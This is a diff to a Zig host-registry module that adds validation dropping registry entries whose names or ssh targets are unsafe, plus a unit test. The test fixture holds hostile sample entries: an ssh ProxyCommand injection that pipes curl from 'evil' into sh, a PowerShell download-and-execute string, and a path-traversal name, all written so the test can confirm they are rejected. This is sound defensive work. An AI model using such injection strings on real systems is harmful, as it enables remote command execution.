@@ -19,6 +19,9 @@ pub const Registry = struct {
     self_line: ?[]const u8,
     /// Which host is this machine (after WORK_SELF, the self line, tailnet, hostname).
     self: ?[]const u8,
+    /// Entries `load` refused. Shown where a human reads the registry, never on
+    /// the protocol's output.
+    dropped: usize = 0,
 
     pub fn find(reg: Registry, token: []const u8) ?Host {
         return if (reg.resolve(token)) |i| reg.hosts[i] else null;
@@ -60,6 +63,7 @@ pub fn load(ctx: sys.Ctx) !Registry {
     const path = try configPath(ctx);
     var hosts: std.ArrayList(Host) = .empty;
     var self_line: ?[]const u8 = null;
+    var dropped: usize = 0;
     if (sys.readFile(ctx, path)) |bytes| {
         var lines = std.mem.splitScalar(u8, bytes, '\n');
         while (lines.next()) |raw| {
@@ -72,11 +76,18 @@ pub fn load(ctx: sys.Ctx) !Registry {
                 const name = words.next() orelse continue;
                 const target = words.next() orelse continue;
                 const kind: Kind = if (std.mem.eql(u8, words.next() orelse "posix", "msys")) .msys else .posix;
+                // The registry is rewritten by `agb deploy` from another machine:
+                // a destination that is really an ssh option would run a command
+                // here on the next listing. An entry that is not a machine is dropped.
+                if (!sys.validSlug(name) or !sys.validSshTarget(target)) {
+                    dropped += 1;
+                    continue;
+                }
                 try hosts.append(ctx.gpa, .{ .name = name, .target = target, .kind = kind });
             }
         }
     }
-    var reg = Registry{ .path = path, .hosts = hosts.items, .self_line = self_line, .self = null };
+    var reg = Registry{ .path = path, .hosts = hosts.items, .self_line = self_line, .self = null, .dropped = dropped };
     reg.self = detectSelf(ctx, reg);
     return reg;
 }
@@ -165,6 +176,32 @@ pub fn renderFor(ctx: sys.Ctx, reg: Registry, self_name: []const u8) ![]u8 {
     for (reg.hosts) |h| try out.appendSlice(ctx.gpa, try ctx.fmt("host {s} {s} {s}\n", .{ h.name, h.target, @tagName(h.kind) }));
     try out.appendSlice(ctx.gpa, try ctx.fmt("self {s}\n", .{self_name}));
     return out.items;
+}
+
+test "an entry that is not a machine is dropped, whatever wrote the file" {
+    var arena = std.heap.ArenaAllocator.init(std.testing.allocator);
+    defer arena.deinit();
+    const gpa = arena.allocator();
+    var env = std.process.Environ.Map.init(gpa);
+    var tmp = std.testing.tmpDir(.{});
+    defer tmp.cleanup();
+    const path = try std.fs.path.join(gpa, &.{ ".zig-cache", "tmp", &tmp.sub_path, "hosts.conf" });
+    try env.put("WORK_CONFIG", path);
+    try env.put("WORK_SELF", "good");
+    const ctx = sys.Ctx{ .io = std.testing.io, .gpa = gpa, .env = &env };
+    try sys.writeFileAtomic(ctx,
+        path,
+        \\host good frb@good posix
+        \\host evil -oProxyCommand=curl\u{20}evil|sh posix
+        \\host pwsh a';iex(iwr\u{20}x);#@win msys
+        \\host ../../etc frb@x posix
+        \\host scp frb@host:/tmp posix
+        \\
+    );
+    const reg = try load(ctx);
+    try std.testing.expectEqual(@as(usize, 1), reg.hosts.len);
+    try std.testing.expectEqual(@as(usize, 4), reg.dropped);
+    try std.testing.expectEqualStrings("good", reg.hosts[0].name);
 }
 
 test "resolve by name, prefix and dash word" {
